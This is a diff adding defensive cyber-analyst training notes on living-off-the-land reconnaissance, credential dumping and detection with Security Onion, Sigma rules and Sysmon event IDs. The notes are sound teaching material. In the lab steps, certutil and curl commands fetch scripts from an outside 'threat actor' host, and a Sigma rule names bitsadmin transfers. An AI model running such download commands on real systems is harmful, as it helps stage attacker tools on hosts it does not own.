@@ -3258,7 +3258,1265 @@ NOTE: The group of Knowledge Checks that follow this task refers to the challeng
 
 ﻿------------------------------
 
- 
+#### CDAH-M9L1 Living off the Land ####
+
+
+Workflow
+
+
+To see what sort of information an attacker can discover about a machine with simple command execution on it, log in to a Windows domain machine and run a reconnaissance script that has been prepared with several of these commands.
+
+
+1. Log in to the ch-edu-1 Virtual Machine (VM) using the following credentials:
+Username: ksmith
+Password: CyberTraining1!
+
+
+
+This is one of the domain systems in the mission partner’s network.
+
+
+2. Open a Windows Command Line terminal.
+
+
+3. Run the recon.bat situational awareness script using the following command:
+C:\Users\ksmith>.\recon.bat
+
+
+
+Recon.bat is a prewritten situational awareness script containing several of the commands listed above.
+
+![image](https://github.com/user-attachments/assets/45e9a9fc-9d7a-475c-809e-7ad55d11b94a)
+
+![image](https://github.com/user-attachments/assets/22ee7712-617d-4573-9013-c43da7f23be5)
+
+![image](https://github.com/user-attachments/assets/3fb43a06-8303-460e-aa4c-3eeae9d57057)
+
+![image](https://github.com/user-attachments/assets/94242ed4-36cd-4278-aa7d-00bb576708a4)
+
+
+-----------------------------------------
+
+Workflow
+
+
+1. Log in to the ch-edu-1 VM using the following credentials:
+Username: ksmith
+Password: CyberTraining1!
+
+
+
+2. Open Windows Command Prompt.
+
+
+3. Enter the following command to list the contents of the current directory:
+dir
+
+
+
+4. Enter the following command to download the reconnaissance script hosted privately by a threat actor from outside the mission partner network:
+C:\Users\ksmith>certutil.exe -urlcache -split -f http://128.0.7.205/recon_original.txt
+
+
+
+This command and the earlier ones like it are how many attacker tools and scripts are pulled onto a machine prior to their use. 
+
+![image](https://github.com/user-attachments/assets/929cab93-8fde-4309-b967-09627d21f89e)
+
+5. Enter the following command to confirm the new file has appeared in the current directory:
+dir
+
+
+
+The file recon_original.txt has been downloaded into the directory.
+
+
+-------------------------------------------
+
+Workflow
+
+
+1. Log in to the ch-edu-1 VM using the following credentials:
+Username: ksmith
+Password: CyberTraining1!
+
+
+
+This is one of the domain systems in the mission partner’s network.
+
+
+2. Open a Windows Command Line terminal.
+
+
+3. Enter the following command to test whether the current user can execute VBScript code located in a file: 
+C:\Users\ksmith>cscript.exe test.vbs
+
+
+![image](https://github.com/user-attachments/assets/6f2632d6-2300-407d-8b55-c2b508ac91ba)
+
+This script silently created a new file on the OS. If this file had been located in an obscure directory and if the script had also added a Windows Registry key that regularly executed the file, this sort of code execution would directly lead to persistence on the compromised machine.
+
+
+If an attacker can successfully execute this co de, it opens numerous functions to le verage, such as the creation of malicious shortcuts, the manipulation of valid installation packages, the creation of malicious Office macros, the opening of network connections, the creation of new users, and any other activity that an attacker may want to hide from a user inside otherwise-innocuous files.
+
+---------------------------------------------
+
+Workflow
+
+
+1. Log in to the win-hunt VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open the Chrome browser, and log in to the Security Onion Console (SOC) using the corresponding bookmark and the following credentials:
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+
+
+
+NOTE: A “Your connection is not private” warning will appear after clicking the bookmark. Click Advanced and then Proceed to 199.63.64.92 (unsafe) to get to the Security Onion login page.
+
+
+3. Go to the Sysmon Visualizer dashboard of Kibana using the corresponding bookmark.
+
+
+4. Set the date range for the prescribed baseline period.
+
+
+Cyber Protection Team (CPT) leadership has determined that Dec 8, 2021 @ 00:00:00.000 to Dec 16, 2021 @ 23:30:00.000 was designated as the collection period for baseline activity.
+
+
+This dashboard comes prepared with several visualizations that may be used to determine the environment’s baseline at a glance:
+List of created process names.
+Pie graph indicating the parent processes for all included records.
+Bar graph of the users involved in the included records.
+Table of the most common arguments in the command-line execution of the included records.
+
+![image](https://github.com/user-attachments/assets/5172ea7e-088f-4c82-8b3e-d3dd11061797)
+
+5. Enter the following query to determine what use of the net command looks like in this environment, as that is one of the most common in typical reconnaissance patterns:
+process.name : net.exe
+
+![image](https://github.com/user-attachments/assets/48e90c6b-39df-4e06-9b38-5ebc6076aa8b)
+
+This command is being run from either the PowerShell or Windows Command Line terminal and is being run by only a few users in the domain. Therefore, the use of this command by anyone else might be worthy of the creation of a low-priority alert. Replace net.exe with additional process names typically used for situational awareness to perform similar analysis and create alerts.
+
+![image](https://github.com/user-attachments/assets/c1301d42-242c-498b-a8b4-95507e4f0dd8)
+
+![image](https://github.com/user-attachments/assets/ad8e6b38-76df-48de-8fed-b0d08fa5a949)
+
+
+
+-----------------------------------------
+
+Workflow
+
+
+1. Log in to the win-hunt VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open the Chrome browser, and log in to the SOC using the corresponding bookmark and the following credentials:
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+
+![image](https://github.com/user-attachments/assets/4fd429a3-845c-4152-8e91-e14632278eda)
+
+3. Select Playbook on the left pane.
+
+
+![image](https://github.com/user-attachments/assets/de85aeee-85ee-4983-8dc2-31b04718ade8)
+
+4. Select Create New Play.
+
+
+![image](https://github.com/user-attachments/assets/f1e6bd8f-4082-4b5d-b5ce-90ed9aee68ea)
+
+5. Enter the Sigma Rule syntax:
+
+
+NOTE: If paste errors are noticed copying the code into the VM, copy and paste from the file on win-hunt: C:\Users\trainee\Documents\bitsadmin.yml.
+
+
+
+title: Bitsadmin Download
+id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
+status: experimental
+description: Detects usage of bitsadmin downloading a file
+references:
+- https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
+- https://isc.sans.edu/diary/22264
+tags:
+- attack.defense_evasion
+- attack.persistence
+- attack.t1197
+- attack.s0190
+date: 2017/03/09
+modified: 2019/12/06
+author: Michael Haag
+logsource:
+category: process_creation
+product: windows
+detection:
+selection1:
+Image:
+- '*\bitsadmin.exe'
+CommandLine:
+- '* /transfer *'
+selection2:
+CommandLine:
+- '*copy bitsadmin.exe*'
+condition: selection1 or selection2
+fields:
+- CommandLine
+- ParentCommandLine
+falsepositives:
+- Some legitimate apps use this, but limited.
+level: medium
+
+![image](https://github.com/user-attachments/assets/cce3e732-5891-4c73-bd2e-7a4c84f771b7)
+
+6. It is good practice to convert the rule into the query syntax for the associated SIEM before finalizing the Play. This ensures that the rule is performing as intended.
+
+![image](https://github.com/user-attachments/assets/29ce28f2-8a88-43b1-bb78-ea435f6e2ea8)
+
+7. Select Create Play from Sigma.
+
+![image](https://github.com/user-attachments/assets/d9a0f571-9e09-4a22-9a66-3762b963fabf)
+
+8. Select Edit from the Draft Play pane.
+
+![image](https://github.com/user-attachments/assets/7bcd3954-2c71-4e07-8cb7-cc3ed43ee88b)
+
+9. Select Active from the drop-down menu Status.
+
+![image](https://github.com/user-attachments/assets/929e12f8-228e-4184-8ee6-532ea46e6c81)
+
+10. Select Submit.
+
+![image](https://github.com/user-attachments/assets/5fb92378-3415-4253-ad54-14a7f955a694)
+
+11. Select Active Plays from the right-hand toolbar to find the new Play among the existing Active Plays.
+
+![image](https://github.com/user-attachments/assets/e1594c4e-faa8-452d-bd0a-caa2fd73a609)
+
+It takes approximately 15 minutes for a new Play to be fully integrated into the SIEM before new alerts associated with the activity are active. 
+
+
+While waiting for a new Play to become active, it is helpful to observe how one of the currently active Plays populates an alert in the Security Onion Alerts dashboard.
+
+
+12. Open and inspect the Whoami Play in the active plays by selecting the Play number. The Sigma rule syntax is expanded by selecting View Sigma.
+
+![image](https://github.com/user-attachments/assets/8efd8c2f-76a3-4b5c-a531-50e2726d9f5c)
+
+13. Log in to the ch-edu-1 VM using the following credentials:
+Username: ksmith
+Password: CyberTraining1!
+
+
+
+14. Open a Windows Command Line terminal, and execute the whoami command:
+C:\\Users\ksmith>whoami
+
+![image](https://github.com/user-attachments/assets/710e95b3-c4f5-4b22-82dd-237442f065fa)
+
+15. In the win-hunt machine, open the Security Onion Alerts console using the Alerts bookmark for the last 24 hours time period.
+
+
+![image](https://github.com/user-attachments/assets/541a8d16-d18c-449a-b535-b86d973fdcaf)
+
+The  execution of the commands, bina ries, or patterns identified by Plays in Security Onion Playbook triggers alerts in this dashboard, which is how potentially malicious activity may be monitored.
+
+------------------------------------------
+
+Workflow
+
+
+1. Log in to the ch-dev-cent VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+This is a Linux system in the mission partner’s network.
+
+
+2. Click Activities and open Terminal.
+
+![image](https://github.com/user-attachments/assets/aa1d1ffa-8faa-4989-abe4-64c874e3d940)
+
+3. Enter the following command to run a prewritten situational awareness script.
+[trainee@ch-dev-cent ~]$ ./recon.sh
+
+![image](https://github.com/user-attachments/assets/8fbcfd1b-0c65-4c26-bfce-ebf0a1651d12)
+
+
+![image](https://github.com/user-attachments/assets/66c6abdc-18ed-4ac8-aa0a-dcc11cea67b8)
+
+![image](https://github.com/user-attachments/assets/751c70c2-5507-4336-a392-92c2b2cbe8f8)
+
+-----------------------------------
+
+Workflow
+
+
+1. Log in to the ch-dev-cent VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open Terminal.
+
+
+![image](https://github.com/user-attachments/assets/7bd5bb3b-34d2-4fac-bd4e-07e08a352311)
+
+Figure 9.1-22
+
+
+3. Run the following command to verify the contents of the current directory:
+ls -l
+
+
+
+4. Run the following command:
+[trainee@ch-dev-cent ~]$ curl http://128.0.7.205/recon_original.sh -o recon_original.txt
+
+
+![image](https://github.com/user-attachments/assets/2987b10d-ea97-478f-9a42-77d33a53c94c)
+
+5. Review the new contents of the directory by running the following command:
+ls -l
+
+
+
+Note that the new file recon_original.txt has appeared.
+
+![image](https://github.com/user-attachments/assets/03b31927-6df6-47d0-89cf-a9d293d5dcda)
+
+![image](https://github.com/user-attachments/assets/fe547c05-24ae-424b-9ddb-bd7f1986314a)
+
+
+-------------------------------------------
+
+
+
+
+Workflow
+
+
+1. Log in to the ch-dc1 VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+This is the Domain Controller (DC) in the mission partner’s network.
+
+
+2. Open a PowerShell terminal as an Administrator.
+
+
+3. Import the grouppolicy module into the current PowerShell session:
+PS C:\Windows\System32> Import-Module grouppolicy 
+
+
+
+This allows a user access to all the necessary group policy management cmdlets during the current session.
+
+
+4. Create a new Group Policy Object with a name and description relevant to the security control being enforced.
+PS C:\Windows\System32> New-GPO -Name "PSExecutionPolicy" -Comment "Enforces cryptographic signing on any executed PowerShell scripts"
+
+
+![image](https://github.com/user-attachments/assets/9377ec3b-08eb-4b79-a825-851278ef8e39)
+
+5. Use the Set-GPRegistryValue cmdlet to configure the new GPO. 
+PS C:\Windows\System32> Set-GPRegistryValue -Name "PSExecutionPolicy" -Key "HKLM\Software\Policies\Microsoft\Windows\PowerShell" -ValueName ExecutionPolicy -Type String -Value "AllSigned"
+
+![image](https://github.com/user-attachments/assets/64689afe-6d3e-4e09-9933-a7e4c9897a0a)
+
+6. Link the new GPO to all systems in the domain.
+PS C:\Windows\System32> New-GPLink -Name "PSExecutionPolicy" -Target "ou=Systems,dc=vcch,dc=lan"
+
+
+![image](https://github.com/user-attachments/assets/3e12de4c-8b5b-455b-90d9-c3c809bc3142)
+
+For those users for whom PowerShell is allowlisted, only signed scripts may be run, significantly improving the security state of the enterprise.
+
+
+
+
+------------------------
+
+
+#### CDAH-M9L2-Dumping Credentials ####
+
+
+Workflow
+
+
+1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:
+
+
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open Sublime Text 3:
+
+
+
+
+
+
+
+3. Select File > Open File..., and open smtp.settings:
+C:\Users\trainee\AppData\Roaming\smtp\smtp.settings
+
+
+
+NOTE: The AppData folder is normally hidden by default.
+
+
+The smtp.settings is an example configuration file for an SMTP client to communicate with an SMTP server. The configuration defines the SMTP host, port, protocol, username, and password. If not stored properly, a configuration file, such as the SMTP file, can become an easy target for adversaries looking to dump credentials and perform lateral movement. 
+
+
+![image](https://github.com/user-attachments/assets/5cf9ee08-b5f5-4f36-aa12-8b1415cec824)
+
+Examine smtp.settings, and notice that smtp_username and smtp_password are stored in plaintext, meaning once the adversary discovers this file they have the credentials. The stored username is trainee@vcch.lan and password is CyberTraining1!. The file smtp.settings is an example of insecure system credential storage and should not be allowed on any host or any system.
+
+
+A secure option for saving and utilizing credentials is to use integrated Windows authentication with the SAM database on the local host, when available to the application. Windows securely collects credentials via user input on the user login interface or programmatically via the API for the SAM database. The credential information collected is then presented to an authenticating system or service. The physical location of the SAM database is located in the following path:
+%SystemRoot%\system32\config\SAM
+
+
+
+The SAM database is loaded into the registry on system startup. All interactions with the SAM database use Windows functions and are updated in the registry. The majority of registry keys that are relevant to attackers and defenders are in the H_KEY_LOCAL_MACHINE (HKLM) hive. This root is maintained in memory. On bootup, the kernel loads the keys that are contained in HKLM from disk and creates others dynamically based on the hardware attached to the system. The subkeys that have restricted access have restrictions for the administrator account and are normally modified under the context of the local account SYSTEM. SYSTEM is used by the OS and services that run under Windows to access Windows internals. The registry entries under the SAM, SECURITY, and Boot Configuration Data (BCD) keys are modified and changed with specific tools and applications within Windows to limit and prevent accidental or intentional configuration changes that may make the system unusable. 
+
+
+Changes that an attacker makes can be detected by watching for changes to the keys HKLM\SAM\SAM\DOMAINS\Account\Users\Names\<accountname>. Validating when new users are added and changes to the Local Administrators group (HKLM\SAM\SAM\Domains\Builtin\Aliases\0000220\) can identify rogue accounts and suspicious activity. 
+
+
+--------------------------
+
+Workflow
+
+
+1. Log in to the ch-tech-1 VM using the following credentials:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+2. Open PowerShell.
+
+
+3. Execute the following command to securely prompt the user for credentials:
+PS C:\Users\trainee> $Mycredential = Get-Credential 
+
+
+
+The cmdlet Get-Credential creates an object for a specified user name and password. 
+
+
+The following screen appears:
+
+![image](https://github.com/user-attachments/assets/88b1089a-159a-496a-9c20-5886de029417)
+
+4. Enter the following credential information and select OK:
+Username: trainee
+Password: CyberTraining1!
+
+
+
+$Mycredential is now a newly-created object, linked with the trainee account on the local host.
+
+
+5. Execute the following command to display the credential object:
+PS C:\Users\trainee> $Mycredential
+
+
+
+The output provides the UserName but does not provide the password in plaintext since the password is stored as a SecureString.
+
+
+![image](https://github.com/user-attachments/assets/1aa3a535-ada0-42b3-9858-2f2acfe2c001)
+
+
+
+
+6. Execute the following commands to securely prompt a user for credentials from the command line:
+PS C:\Users\trainee> $user = Read-Host "Enter Username"
+Enter Username: trainee
+PS C:\Users\trainee> $pass = Read-Host "Enter Password" -AsSecureString
+Enter Password: CyberTraining1!
+
+![image](https://github.com/user-attachments/assets/1166e4e2-c14e-41f9-9218-b161467bdf7f)
+
+The Read-Host command creates a variable and securely stores the credential information associated with it. Notice the user's input is masked when the -AsSecureString option is used. A downside of creating an object or variable using the SecureString is that SecureString objects cannot be saved for a file for later use. To save a SecureString object, it must be converted to an encrypted standard string.
+
+
+7. Execute the following command to convert a plaintext string to a SecureString and then to an encrypted string:
+PS C:\Users\trainee> "CyberTraining1!" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString
+
+
+
+The password CyberTraining1! is entered using the ConvertTo-SecureString as plaintext. This takes the input (CyberTraining1!) and converts it into a SecureString. The cmdlet ConvertFrom-SecureString converts SecureString objects into an encrypted standard string. The input is converted into an encrypted standard string. 
+
+![image](https://github.com/user-attachments/assets/5df760b2-c20c-4aac-aa6e-5f55e3494fe2)
+
+The encrypted string can be saved and returned to later for retrieval and use.
+
+
+The cmdlets are an effective means of managing and storing credential information. PowerShell scripting often requires credential information to automate processes — the information required should not be stored as plaintext. Using the cmdlet ConvertTo-SecureString, credential information is managed securely in PowerShell. The cmdlet ConvertFrom-SecureString encrypts and stores the credential information. 
+
+
+The cmdlet ConvertFrom-SecureString uses the Advanced Encryption Standard (AES) algorithm to encrypt credentials. The AES algorithm converts the string stored in SecureString to an encrypted standard string. 
+
+
+8. Execute the following command:
+PS C:\Users\trainee> Get-Credential | Export-CliXml  -Path MyCredential.xml
+
+
+
+The cmdlet Export-Clixml exports the encrypted credential object. By encrypting credential objects, PowerShell ensures that only the account associated with the object can decrypt it. 
+
+
+9. When prompted, enter the following credentials, and select OK:
+Username: trainee
+Password: CyberTraining1!
+
+![image](https://github.com/user-attachments/assets/4f893158-8b0e-41bf-9a21-f4f34fbb3328)
+
+
+
+
+The following cmdlet is an automated alternative to the cmdlet utilized in Step 7. The cmdlet takes the entered credentials, encrypts the credentials using the AES algorithm, and outputs the encrypted credentials to the file MyCredential.xml located in the following path:
+C:\Users\trainee
+
+
+
+10. Open MyCredential.xml in Internet Explorer.
+C:\Users\trainee\MyCredential.xml
+
+
+![image](https://github.com/user-attachments/assets/ffc6d616-fb95-472a-b4f5-7700eaa4431d)
+
+Notice the password is not saved in plaintext but is safely encrypted in the file. The password can be used in programs, such as PowerShell, where it can be securely shared and decrypted.
+
+
+-----------------------------
+
+Hunting for Credential Dumping
+Walk through the creation and development of visualizations and hunting strategies to detect credential dumping on the network. 
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the win-hunt VM using the following credentials:
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Open Google Chrome.
+
+﻿
+
+3. Select the Visualize - Elastic bookmark. 
+
+﻿
+
+NOTE: A “Your connection is not private” warning will appear after clicking the bookmark. Click Advanced and then Proceed to 199.63.64.92 (unsafe) to get to the Security Onion login page.
+
+﻿
+
+4. Open Security Onion using the following credentials:
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+5. In Visualize Library, select Create visualization.
+
+﻿
+
+6. In New visualization, select Aggregation based > Data Table.
+
+﻿
+
+7. Within the New Line/Choose a source window, select *:so-*.
+
+﻿
+
+8. Set the time span for the data table to December 10, 2021 @ 14:00:00.000 - December 10, 2021 @ 14:30:00.000.
+
+﻿
+
+9. Add a bucket using split rows with the following information:
+
+Aggregation: Terms
+
+Field: agent.hostname.keyword
+
+Metric: Count
+
+Order: Descending 
+
+Size: 100
+
+10. Add another bucket using split rows with the following information:
+
+Aggregation: Terms
+
+Field: process.name.keyword
+
+Metric: Count
+
+Order: Descending 
+
+Size: 100
+
+If needed, select Update to update the data in the table.
+
+
+![image](https://github.com/user-attachments/assets/2ffc3a7b-ba30-431b-8dc6-ea3c0699a2c9)
+
+The table displays all the processes on the hosts through the VCCH network. The visualization enables detection based on the process name. The results of this data table include numerous pages with only a 30-minute time span. This means detection using this data table needs to include filters and query parameters. 
+
+
+NOTE: The table is sorted by descending on the column Count. 
+
+
+11. In the Search, execute the following query to search for the Mimikatz process:
+process.name.keyword: "mimikatz.exe"
+
+
+
+Mimikatz is a tool frequently used to gain credential information. The query asks the data table to return only records that use the process mimikatz.exe on the VCCH network. 
+
+
+![image](https://github.com/user-attachments/assets/8c2cc500-5d79-43de-8cfd-d919dca71b43)
+
+The data table displays that the process mimikatz.exe was used twice in the 30-minute time span of the query.
+
+
+12. Add another bucket using split rows with the following information:
+Aggregation: Terms
+Field: event.code.keyword
+Metric: Count
+Order: Descending 
+Size: 100
+
+Event.code is the event field associated with the log file. 
+
+
+![image](https://github.com/user-attachments/assets/77ad9aae-0f57-4445-8cb8-e4a855881cda)
+
+The data table displays that the process mimikatz.exe was seen or logged in Windows event ID 4688 and Sysmon event ID 1 on host ch-tech-2. As stated previously in this lesson, Windows event ID 4688 and Sysmon event ID 1 are collected when a process is created. These events, paired with the process mimikatz.exe, are cause for concern that MCA is occurring on the network. The data table is useful in initial discovery of suspicious activity, however, it does not tell the entire story. 
+
+
+13. Open a new tab and select the Discover - Elastic bookmark. 
+
+
+14. Within Discover - Elastic, set the time span for the data table to December 10, 2021 @ 14:00:00.000 – December 10, 2021 @ 14:30:00.000.
+
+
+15. In the Search, execute the following query to search for ProcessAccess related events:
+event.code: 10
+
+
+
+As stated previously in this lesson, Windows event ID 4656 and Sysmon event ID 10 are collected when a process is accessed. This means a process accessed or used another process. Once Windows event ID 4688 and Sysmon event ID 1 are identified with a suspicious process, the next step is to hunt for Windows event ID 4656 and Sysmon event ID 10. Hunting for Windows event ID 4656 and Sysmon event ID 10 discovers the use of the suspicious process found, in this case, mimikatz.exe. The above query filters the data collected by the SIEM to only show Sysmon Event ID 10.
+
+
+With the query applied, the Discover page looks similar to Figure 9.2-11:
+
+![image](https://github.com/user-attachments/assets/4557b8bc-27d2-49f4-b3d4-b80226ae54c5)
+
+The Discover page indicates there are six occurrences of the Sysmon event ID 10. 
+
+
+16. Add a filter to the Discover page for the ch-tech-2 machine with the following information, and select Save:
+
+![image](https://github.com/user-attachments/assets/355b3c99-54fb-4a99-ac81-b4f518452a42)
+
+As shown in the data table previously created, the mimikatz.exe process was run on the ch-tech-2 host. The Discover page now only shows data collected from the ch-tech-2 machine.
+
+
+17. Drill down on the first record that was collected December 10, 2021 @ 14:03:14.184.
+
+
+18. Add the process.executable and process.name fields to the Discover table.
+
+![image](https://github.com/user-attachments/assets/4f1607b1-1dc3-44c5-9a84-9f262d153088)
+
+Notice the process associated with Sysmon event ID 10 is the executable lsass.exe. lsass.exe is frequently targeted by adversaries who have gained access to a host and are attempting to dump credentials and elevate privileges. A tool such as Mimikatz is frequently used in this campaign. 
+
+
+19. Add the winlog.event_data.TargetImage field to the Discover table.
+
+![image](https://github.com/user-attachments/assets/d2ea4ed4-dce0-43ab-b68c-9e5cf766cda3)
+
+
+The winlog.event_data.TargetImage field displays the path to the process that initiated the process, which caused Sysmon event ID 10 to be recorded. In Figure 9.2-14, mimikatz.exe was the process that accessed and used the process lsass.exe. Additionally, mimikatz.exe was run out of Luke.Dunlap's directory. The user account Luke.Dunlap and host ch-tech-2 must immediately be disabled and reviewed by the security team as they likely have been compromised by an adversarial presence attempting to dump credentials and elevate privileges.  
+
+
+--------------------
+
+
+Hunting for Credential Dumping Activity on the VCCH Network
+As with host ch-tech-2, the VCCH network is vulnerable to suspicious activity including credential dumping. The host ch-tech-2 may not be the only one on the network that is being exploited by a persistent threat. The VCCH network owner has requested analysis of their network to determine if there are additional adversarial presences attempting to dump credentials from an exploited host. VCCH has requested a review of data collected from December 13, 2021, specifically between 13:45:00.000 and 14:45:00.000.
+
+﻿
+
+Workflow
+
+﻿
+
+1. Log in to the win-hunt VM using the following credentials:
+
+﻿
+
+Username: trainee
+Password: CyberTraining1!
+﻿
+
+2. Log in to Security Onion and Elastic Stack using the following credentials:
+
+﻿
+
+Username: trainee@jdmss.lan
+Password: CyberTraining1!
+﻿
+
+3. Select the Discover - Elastic bookmark, and create a data table to aid in the investigation of the questionable network activity. Set the time span in Elastic to December 13, 2021 @ 13:45:00.000 – 14:45:00.000. 
+
+![image](https://github.com/user-attachments/assets/d3f37d1a-3b16-4817-a4ef-d630ac25ec28)
+
+![image](https://github.com/user-attachments/assets/f076d761-76ad-4d7f-b82e-83563047a952)
+
+-----------------------------
+
+Host Activity
+ch-tech-1 has experienced the process mimikatz.exe running within the specified time span. mimikatz.exe is malware that is frequently used by adversaries to leverage vulnerabilities and find useful credential information. Any use of mimikatz.exe should be considered suspicious and must be investigated. 
+
+﻿
+
+Events Associated with mimikatz.exe
+﻿
+
+Workflow
+
+﻿
+
+NOTE: The following step continues from the previous steps.
+
+﻿
+
+4. Add the event.code field to the data to discover the events associated with mimikatz.exe. 
+
+![image](https://github.com/user-attachments/assets/cb97f52d-8f64-4115-bef1-e6dd4f90496d)
+![image](https://github.com/user-attachments/assets/2cc3759f-69a6-47e8-84c4-89905724b103)
+
+
+
+
+Discover Activity
+﻿
+
+Figure 9.2-15
+
+﻿
+
+Event codes 1, 10, and 4688 are associated with mimikatz.exe. These events needs to be investigated further to determine the type of activities that are associated with them.
+
+﻿![image](https://github.com/user-attachments/assets/12fcfffd-02f3-486f-a2f2-873131e5bb61)
+
+
+Workflow
+
+﻿
+
+NOTE: The following step continues from the previous steps.
+
+﻿
+
+5. Access the Discover page. Filter the page by host ch-tech-1. Ensure the time span is set to the span in question. 
+
+----------------
+
+Hunting for Sysmon Event ID 10
+
+![image](https://github.com/user-attachments/assets/3075ad2a-0bd6-4ce3-a135-d336cda98948)
+
+The ch-tech-1 host experienced 1,926 events over the 60-minute time span. 
+
+
+Based on the data table created previously, ch-tech-1 was used to access mimikatz.exe (Sysmon event ID 1). Based on the data table, mimikatz.exe on host ch-tech-1 was used to access another process (Sysmon event ID 10).
+
+
+Workflow
+
+
+NOTE: The following step continues from the previous steps.
+
+
+6. Query the Discover page for Sysmon event ID 10. Ensure the ch-tech-1 host is still in place.
+
+
+![image](https://github.com/user-attachments/assets/b351ff53-fa3e-4ddd-87ab-bf0cdc0162bb)
+
+![image](https://github.com/user-attachments/assets/605ab211-42f0-47ad-8f06-1c4355429d15)
+
+
+-------------------------------
+
+
+
+Workflow
+
+
+NOTE: The following step continues from the previous steps.
+
+
+7. Include an additional parameter in the query. Query the Discover page for Sysmon event ID 10 and mimikatz.exe. Ensure the ch-tech-1 host is still in place. 
+
+![image](https://github.com/user-attachments/assets/912c4945-63b0-4070-ac5a-10f18c8894e0)
+
+
+![image](https://github.com/user-attachments/assets/b8b1a40a-0c86-4b03-84a6-564b1f878788)
+
+
+----------------------------------
+
+Workflow
+
+
+NOTE: The following step continues from the previous steps.
+
+
+8. Review the Sysmon event ID 10 log file details, and answer the following questions. 
+
+![image](https://github.com/user-attachments/assets/38a6d91b-936c-4958-a134-279d6e481791)
+
+![image](https://github.com/user-attachments/assets/4b8fad1e-8704-4ed7-8c32-3891e5a4ab03)
+
+-----------------------------
+
+![image](https://github.com/user-attachments/assets/55b78b23-0fe0-4f9a-9130-c204c41ffdab)
+
+![image](https://github.com/user-attachments/assets/9710f1f2-3ce4-41a4-ad7b-8d8d780b7fbd)
+
+
+---------------------------------------
+
+![image](https://github.com/user-attachments/assets/f9e95b57-8b2b-4f1a-b225-373ae9c25276)
+
+![image](https://github.com/user-attachments/assets/0c58121c-3c05-4083-a7b0-267170d15f09)
+
+-----------------------
+
+#### CDAH-M9L3-UNIX Privilege Escalation ####
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
